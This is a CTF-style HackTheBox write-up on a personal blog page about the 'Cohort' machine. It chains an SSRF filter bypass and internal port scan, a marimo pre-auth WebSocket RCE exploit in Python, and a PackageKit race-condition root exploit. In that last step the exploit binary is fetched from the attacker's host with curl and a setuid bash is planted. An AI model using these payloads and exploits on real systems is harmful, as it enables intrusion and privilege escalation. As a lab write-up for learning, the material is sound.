@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cohort Writeup | BitR1FT</title>
+  <meta name="description" content="HackTheBox Cohort Writeup — SSRF filter bypass, marimo CVE-2026-39987 pre-auth RCE, PackageKit CVE-2026-41651 TOCTOU race to root.">
+  <link rel="icon" href="bitr1ft.jpg">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- Navigation -->
+  <nav>
+    <a href="index.html" class="nav-brand">&lt;BitR1FT /&gt;</a>
+    <div class="nav-links">
+      <a href="index.html#about">About</a>
+      <a href="index.html#experience">Experience</a>
+      <a href="projects.html">Projects</a>
+      <a href="blog.html" class="active">Writeups</a>
+      <a href="AdeelHaider.pdf" target="_blank">Resume</a>
+      <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer" class="github-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+      </a>
+    </div>
+    <button class="nav-hamburger" id="nav-hamburger" aria-label="Menu">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="18" y2="18"/></svg>
+    </button>
+  </nav>
+  <div class="mobile-menu" id="mobile-menu">
+    <a href="index.html#about">About</a>
+    <a href="index.html#experience">Experience</a>
+    <a href="projects.html">Projects</a>
+    <a href="blog.html">Writeups</a>
+    <a href="AdeelHaider.pdf" target="_blank">Resume</a>
+  </div>
+
+  <!-- Main Content -->
+  <main style="padding-top:calc(var(--nav-height) + 1rem);">
+    <div style="max-width:48rem;margin:0 auto;padding:0 1rem;">
+
+      <a href="blog.html" class="blog-back">
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+        Back to Writeups
+      </a>
+
+      <div class="blog-header">
+        <div class="blog-title-row">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 12c.78 0 1.5-.38 1.94-.97.44-.6.56-1.38.33-2.08a3.27 3.27 0 0 0-4.54 0 2.05 2.05 0 0 0 .33 2.08c.44.6 1.16.97 1.94.97Z"/><path d="M14.5 17.5c0 1.38-1.12 2.5-2.5 2.5s-2.5-1.12-2.5-2.5c0-1.66 2.5-4.5 2.5-4.5s2.5 2.84 2.5 4.5Z"/></svg>
+          <h1 class="blog-title">Cohort</h1>
+          <span class="badge badge-medium">Medium</span>
+        </div>
+        <p class="blog-os">Linux</p>
+        <p class="blog-summary">Discovered SSRF in /api/validate with trivial loopback filter bypass (127.1, decimal, octal), pivoted to find internal marimo notebook via leaked vhost, exploited CVE-2026-39987 pre-auth WebSocket RCE for foothold, then escalated to root via CVE-2026-41651 PackageKit D-Bus TOCTOU race condition.</p>
+        <div class="blog-meta-row">
+          <div class="blog-meta-section">
+            <div class="vuln-label">Vulnerabilities</div>
+            <div class="tech-tags">
+              <span class="badge badge-destructive">CVE-2026-39987</span>
+              <span class="badge badge-destructive">CVE-2026-41651</span>
+              <span class="badge badge-destructive">SSRF Bypass</span>
+            </div>
+          </div>
+          <div class="blog-meta-section">
+            <div class="tools-label">Tools Used</div>
+            <div class="tech-tags">
+              <span class="badge badge-outline">nmap</span>
+              <span class="badge badge-outline">curl</span>
+              <span class="badge badge-outline">Chromium/Puppeteer</span>
+              <span class="badge badge-outline">Python</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <hr style="max-width:48rem;margin:0 auto 2.5rem;height:1px;background:linear-gradient(90deg,rgba(34,197,94,0.25),transparent);border:none;">
+
+      <div class="prose">
+        <h2>1. Recon</h2>
+        <h3>1.1 Nmap</h3>
+        <pre><code class="language-text">Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-04 01:51 -0400
+Nmap scan report for 10.129.39.150
+Host is up (0.20s latency).
+Not shown: 97 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https</code></pre>
+        <p>A <code>-sV -sC</code> follow-up scan against 22/80/443 identified <code>nginx/1.24.0</code> on 80/443, an SSH banner on 22, and a TLS certificate for <code>cohort.htb</code> with a <strong>wildcard SAN (<code>*.cohort.htb</code>)</strong> &mdash; a strong hint that other vhosts exist on the box, even though nmap only exposed three ports.</p>
+        <p>Added the host to resolution:</p>
+        <pre><code class="language-bash">curl -s -k --resolve cohort.htb:443:10.129.39.150 https://cohort.htb/</code></pre>
+
+        <h3>1.2 Web recon</h3>
+        <p><code>https://cohort.htb/</code> is a client-side rendered SPA ("Cohort Analytics") &mdash; a heavily obfuscated <code>assets/app.js</code> bundle serves the UI. Rather than reverse-engineering the obfuscation statically, the app was driven with a <strong>real headless Chromium</strong> on the attacking Kali box (the only host with VPN access to the HTB network &mdash; Playwright/browser tooling on the local Windows machine could <strong>not</strong> reach the target):</p>
+        <pre><code class="language-bash">chromium --headless=new --no-sandbox --remote-debugging-port=9222 \
+  --host-resolver-rules="MAP cohort.htb 10.129.39.150" --ignore-certificate-errors about:blank &amp;</code></pre>
+        <p>Then connected with <code>puppeteer-core</code> over CDP (<code>http://127.0.0.1:9222</code>) and captured the actual network requests. This revealed a second page:</p>
+        <pre><code class="language-text">/portal.html   →  "Client Insights" — Register a report source URL</code></pre>
+        <p>The portal lets a user submit a URL; the backend claims to fetch and validate it, explicitly stating that <strong>internal/loopback addresses are rejected</strong>. Submitting the form triggers:</p>
+        <pre><code class="language-http">POST /api/validate
+Content-Type: application/json
+{"url": "&lt;user-supplied&gt;", "format": "csv"}</code></pre>
+        <p>This is a server-side URL fetcher &mdash; a classic <strong>SSRF</strong> candidate.</p>
+
+        <hr>
+
+        <h2>2. SSRF (<code>/api/validate</code>)</h2>
+        <h3>2.1 Confirming the vulnerability</h3>
+        <pre><code class="language-bash">curl -s -k -X POST --resolve cohort.htb:443:10.129.39.150 \
+  https://cohort.htb/api/validate -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1/","format":"csv"}'
+# {"ok": false, "message": "Internal or loopback addresses are not permitted."}</code></pre>
+        <p>The filter does a naive substring/exact-match check on <code>127.0.0.1</code> / <code>localhost</code>. It was trivially bypassed:</p>
+        <table>
+          <thead>
+            <tr>
+              <th>Payload</th>
+              <th>Result</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>http://127.1/</code></td>
+              <td>✅ bypass</td>
+            </tr>
+            <tr>
+              <td><code>http://0.0.0.0/</code></td>
+              <td>✅ bypass</td>
+            </tr>
+            <tr>
+              <td><code>http://2130706433/</code> (decimal)</td>
+              <td>✅ bypass</td>
+            </tr>
+            <tr>
+              <td><code>http://0177.0.0.1/</code> (octal)</td>
+              <td>✅ bypass</td>
+            </tr>
+            <tr>
+              <td><code>http://0/</code></td>
+              <td>✅ bypass</td>
+            </tr>
+          </tbody>
+        </table>
+        <p><code>file://</code>, <code>gopher://</code> and other schemes were explicitly rejected (<code>"Only http and https sources are supported."</code>), so the SSRF is restricted to blind HTTP(S) GET &mdash; no local file read.</p>
+
+        <h3>2.2 Internal port scan via SSRF</h3>
+        <p>Using the <code>127.1</code> bypass, common ports were probed one at a time (response content/timing distinguishes open vs closed/filtered):</p>
+        <pre><code class="language-bash">for p in 22 80 443 3000 5000 5432 6379 8000 8080 8443 8888 9000 27017; do
+  curl -s -k -X POST --resolve cohort.htb:443:10.129.39.150 \
+    https://cohort.htb/api/validate -H "Content-Type: application/json" \
+    -d "{\"url\":\"http://127.1:$p/\",\"format\":\"csv\"}" -m 6
+done</code></pre>
+        <p>Findings:</p>
+        <table>
+          <thead>
+            <tr>
+              <th>Port</th>
+              <th>Service</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>5000</strong></td>
+              <td>The Flask/Starlette backend itself (proxied publicly as <code>/api/*</code>)</td>
+            </tr>
+            <tr>
+              <td><strong>8888</strong></td>
+              <td>A <strong>marimo</strong> notebook server — login page, internal-only</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h3>2.3 Bypassing an nginx localhost-only ACL</h3>
+        <p>Directory fuzzing on the public site had turned up <code>/status</code> returning <strong>403 Forbidden</strong> &mdash; consistent with an <code>nginx</code> <code>stub_status</code>-style location restricted by <code>allow 127.0.0.1; deny all;</code>.</p>
+        <p>Because the SSRF makes the <strong>server itself</strong> the requester, fetching <code>/status</code> through it satisfies the <code>127.0.0.1</code> ACL:</p>
+        <pre><code class="language-bash">curl -s -k -X POST --resolve cohort.htb:443:10.129.39.150 \
+  https://cohort.htb/api/validate -H "Content-Type: application/json" \
+  -d '{"url":"http://127.1/status","format":"json"}'</code></pre>
+        <p>This leaked the real (otherwise unguessable) vhost nginx uses to reverse-proxy to the marimo notebook:</p>
+        <pre><code class="language-text">nb-1be3782a8afd3ad5.cohort.htb  →  proxies to 127.0.0.1:8888</code></pre>
+        <p>Confirmed directly:</p>
+        <pre><code class="language-bash">curl -s -k --resolve nb-1be3782a8afd3ad5.cohort.htb:443:10.129.39.150 \
+  https://nb-1be3782a8afd3ad5.cohort.htb/
+# HTTP/1.1 303 See Other
+# location: https://nb-1be3782a8afd3ad5.cohort.htb/auth/login?next=...</code></pre>
+        <p><code>nmap -Pn -p8888 10.129.39.150</code> confirmed the port itself is <strong>closed externally</strong> (<code>conn-refused</code>) &mdash; marimo is genuinely loopback-bound; this discovered vhost is the <em>only</em> public path to it.</p>
+
+        <hr>
+
+        <h2>3. Foothold &mdash; CVE-2026-39987 (marimo pre-auth RCE)</h2>
+        <p>marimo (an interactive Python notebook server, version <strong>0.20.4</strong> per <code>pip list</code> in its venv) ships a <code>/terminal/ws</code> WebSocket endpoint that spawns an OS pty. <strong>CVE-2026-39987</strong> is a pre-auth bypass: <code>validate_auth()</code> is not enforced on this route, so any client that completes the WebSocket handshake gets an unauthenticated interactive shell as the user running marimo.</p>
+        
+        <h3>3.1 Tooling constraints</h3>
+        <ul>
+          <li>Playwright (browser automation) was only available on the analyst's local Windows machine, which has <strong>no route to the HTB VPN</strong> &mdash; only the Kali box does.</li>
+          <li>Python's <code>websocket-client</code> library was available on Kali, but its <code>recv()</code>/timeout handling misbehaved badly over the TLS socket (calls blocked indefinitely regardless of <code>settimeout()</code>), making an interactive exchange impractical.</li>
+        </ul>
+        <p><strong>Solution:</strong> hand-rolled a minimal WebSocket client directly on raw TLS sockets (handshake + RFC 6455 frame parsing), giving full, reliable control over the connection. DNS for the discovered vhost was faked via a <code>socket.getaddrinfo</code> monkey-patch (no root available to edit <code>/etc/hosts</code>), and <code>select()</code> was used for real timeout control on frame reads.</p>
+
+        <h3>3.2 Exploit</h3>
+        <pre><code class="language-python">import socket, ssl, base64, os, struct, time, select
+
+TARGET_IP = "10.129.39.150"
+HOST = "nb-1be3782a8afd3ad5.cohort.htb"
+PATH = "/terminal/ws"
+
+def connect():
+    raw = socket.create_connection((TARGET_IP, 443), timeout=5)
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    s = ctx.wrap_socket(raw, server_hostname=HOST)
+    key = base64.b64encode(os.urandom(16)).decode()
+    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
+           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
+           f"Sec-WebSocket-Version: 13\r\nOrigin: https://{HOST}\r\n\r\n")
+    s.sendall(req.encode())
+    s.settimeout(5)
+    resp = b""
+    while b"\r\n\r\n" not in resp:
+        resp += s.recv(4096)
+    return s
+
+# ... send_text() / recv_frames() implement RFC 6455 framing (mask on send,
+# unmask not required on recv since the server doesn't mask its frames) ...
+
+s = connect()
+recv_frames(s, 3)                       # drain the pty banner / prompt
+send_text(s, "id; whoami; hostname\r")  # \r submits the line to the shell
+print(recv_frames(s, 4).decode())</code></pre>
+        <p>Result:</p>
+        <pre><code class="language-text">uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
+marimo
+cohort</code></pre>
+        <p>Unauthenticated RCE confirmed, as the <code>marimo</code> service account.</p>
+
+        <h3>3.3 User flag</h3>
+        <pre><code class="language-bash">cat /home/marimo/user.txt
+# 505c6a4ede7e6cf6eced4612d46a9538</code></pre>
+
+        <hr>
+
+        <h2>4. Privilege Escalation &mdash; CVE-2026-41651 "Pack2TheRoot" (PackageKit)</h2>
+        
+        <h3>4.1 Enumeration</h3>
+        <p>Standard checks (SUID/SGID, <code>sudo -l</code>, cron/timers, capabilities, systemd units, cloud-init leftovers, world-writable paths, <code>laurel</code>/auditd config) turned up nothing directly exploitable &mdash; the box was deliberately hardened (<code>NoNewPrivileges</code>, restricted userns/ptrace sysctls, etc.). Two other local, unprivileged service accounts (<code>insights</code> running the SSRF backend, <code>_laurel</code> running the audit log processor) were identified but yielded no lateral path.</p>
+        <p>The relevant lead came from checking installed system components rather than the app stack itself:</p>
+        <pre><code class="language-bash">cat /etc/os-release
+dpkg-query -W -f='${Version}\n' packagekit
+command -v dbus-send
+command -v dpkg-deb</code></pre>
+        <p>The box runs an outdated <strong>PackageKit</strong> with D-Bus and <code>dpkg-deb</code> present &mdash; the exact preconditions for <strong>CVE-2026-41651</strong>, a local root exploit nicknamed <strong>Pack2TheRoot</strong>.</p>
+
+        <h3>4.2 The vulnerability</h3>
+        <p>CVE-2026-41651 is a <strong>TOCTOU (time-of-check/time-of-use) race condition</strong> in PackageKit's D-Bus transaction handling:</p>
+        <ol>
+          <li>Open a PackageKit transaction over D-Bus.</li>
+          <li>Call <code>InstallFiles</code> once with the <code>SIMULATE</code> flag set (a dry run).</li>
+          <li>Before the daemon finishes processing that simulated request, immediately send a <strong>second</strong> <code>InstallFiles</code> call on the same transaction &mdash; this time for a <em>real</em> install, pointing at an attacker-controlled <code>.deb</code> path.</li>
+          <li>The daemon's later execution phase ends up reading the <strong>overwritten</strong> path/parameters from the race.</li>
+          <li>PackageKit installs the attacker's <code>.deb</code>, running its <code>postinst</code> maintainer script <strong>as root</strong>.</li>
+        </ol>
+
+        <h3>4.3 Exploitation</h3>
+        <p>Using the public PoC (<code>shibaaa204/Pack2TheRoot</code>), compiled as <code>exploit.bin</code>, transferred to the target the same way as the marimo foothold's SSH-less environment required earlier (own HTTP server on the Kali box, <code>curl</code> pull from the target, since the target has outbound VPN connectivity back to the attacking host):</p>
+        <pre><code class="language-bash"># on Kali
+python -m http.server 8000 --bind 10.10.16.186</code></pre>
+        <pre><code class="language-bash"># on target, as marimo (via the /terminal/ws shell)
+curl -O http://10.10.16.186:8000/exploit.bin
+chmod +x exploit.bin
+
+rm -f /tmp/.suid_bash /tmp/pk.log
+nohup /tmp/exploit.bin &gt;/tmp/pk.log 2&gt;&amp;1 &amp;
+sleep 12
+
+ls -l /tmp/.suid_bash
+cat /tmp/pk.log</code></pre>
+        <p>The exploit races the D-Bus transaction as described above and drops a <strong>setuid-root copy of bash</strong> at <code>/tmp/.suid_bash</code> once it wins the race.</p>
+
+        <h3>4.4 Root</h3>
+        <pre><code class="language-bash">/tmp/.suid_bash -p -c 'id; cat /root/root.txt'</code></pre>
+        <p><code>-p</code> tells bash to <strong>not</strong> drop the effective UID granted by the setuid bit, so the shell retains <code>euid=0</code>.</p>
+        <pre><code class="language-text">uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
+&lt;root flag&gt;</code></pre>
+
+        <hr>
+
+        <h2>5. Summary / Attack Chain</h2>
+        <pre><code class="language-text">nmap → 22/80/443 open, wildcard TLS cert hints at vhosts
+  │
+  ▼
+Web recon (headless Chromium via CDP, Kali-only VPN access)
+  → /portal.html "Client Insights" → POST /api/validate
+  │
+  ▼
+SSRF in /api/validate (naive loopback filter, bypassed via 127.1 / 0.0.0.0 / decimal / octal)
+  → internal port scan: :5000 (own backend), :8888 (marimo, closed externally)
+  → SSRF also bypasses nginx's 127.0.0.1-only ACL on /status
+  → leaks hidden vhost nb-1be3782a8afd3ad5.cohort.htb → proxies to marimo
+  │
+  ▼
+CVE-2026-39987 — marimo /terminal/ws pre-auth RCE
+  → hand-rolled raw WebSocket client (tooling workarounds for env constraints)
+  → shell as marimo (uid 1000) → user.txt
+  │
+  ▼
+CVE-2026-41651 "Pack2TheRoot" — PackageKit D-Bus TOCTOU race
+  → InstallFiles SIMULATE→real race → malicious .deb postinst runs as root
+  → setuid /tmp/.suid_bash → `-p` → root shell → root.txt</code></pre>
+        <pre><code class="language-text">┌──────────────────────────────────────────────────────────────┐
+│                     Cohort - Attack Chain                    │
+├──────────────────────────────────────────────────────────────┤
+│                                                              │
+│  [1] Port Scan (nmap)                                        │
+│   ├── 22/tcp → SSH                                          │
+│   └── 80/443/tcp → HTTP/S (nginx wildcard cert)             │
+│       │                                                      │
+│  [2] Web Enum                                                │
+│   └── Headless Chromium CDP → /portal.html                  │
+│       │                                                      │
+│  [3] SSRF via /api/validate                                  │
+│   └── Bypass filter (127.1 / 0.0.0.0 / decimal / octal)     │
+│       │                                                      │
+│  [4] Internal Enumeration &amp; ACL Bypass                       │
+│   ├── Internal scan: :5000, :8888 (marimo)                  │
+│   └── SSRF to /status → Leak vhost nb-1be378...cohort.htb   │
+│       │                                                      │
+│  [5] Foothold (CVE-2026-39987)                               │
+│   └── marimo pre-auth WebSocket RCE → user.txt              │
+│       │                                                      │
+│  [6] Privilege Escalation (CVE-2026-41651)                   │
+│   └── PackageKit D-Bus TOCTOU Race → root.txt               │
+│                                                              │
+└──────────────────────────────────────────────────────────────┘</code></pre>
+
+        <h2>6. Key Takeaways</h2>
+        <ul>
+          <li><strong>SSRF filters that pattern-match strings instead of resolving/normalizing IPs are trivially bypassed</strong> (alternate loopback representations, decimal/octal encoding).</li>
+          <li><strong>SSRF is a pivot, not just a leak</strong> &mdash; here it was used both for internal port discovery <em>and</em> to bypass an IP-based ACL on an nginx-internal endpoint (<code>/status</code>), which is what actually revealed the path to the vulnerable service.</li>
+          <li><strong>Pre-auth WebSocket routes need the same auth middleware as HTTP routes</strong> &mdash; CVE-2026-39987 existed because <code>/terminal/ws</code> simply didn't call <code>validate_auth()</code>.</li>
+          <li><strong>Outdated system services (PackageKit) are as dangerous as outdated app-layer software</strong> &mdash; the final privesc had nothing to do with the custom "Cohort Analytics" application at all.</li>
+        </ul>
+      </div>
+      <!-- End prose -->
+
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-inner">
+      <div class="footer-contact">
+        <a href="mailto:adeelhaider304@gmail.com">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+          adeelhaider304@gmail.com
+        </a>
+        <span class="sep"></span>
+        <span>
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+          0330-6869777
+        </span>
+        <span class="sep"></span>
+        <span>
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
+          Islamabad, Pakistan
+        </span>
+        <span class="sep"></span>
+        <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+          BitR1FT
+        </a>
+        <span class="sep"></span>
+        <a href="https://www.linkedin.com/in/4deel/" target="_blank" rel="noopener noreferrer">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect width="4" height="12" x="2" y="9"/><circle cx="4" cy="4" r="2"/></svg>
+          4deel
+        </a>
+      </div>
+      <div class="footer-bottom">
+        <p class="footer-left">&copy; 2025 <span class="green">BitR1FT</span> — Adeel Haider</p>
+        <p class="footer-right">
+          <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
+          Built with passion &amp; caffeine
+          <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
+          <span class="accent">pwn all the things</span>
+        </p>
+      </div>
+    </div>
+  </footer>
+  <script src="main.js"></script>
+</body>
+</html>
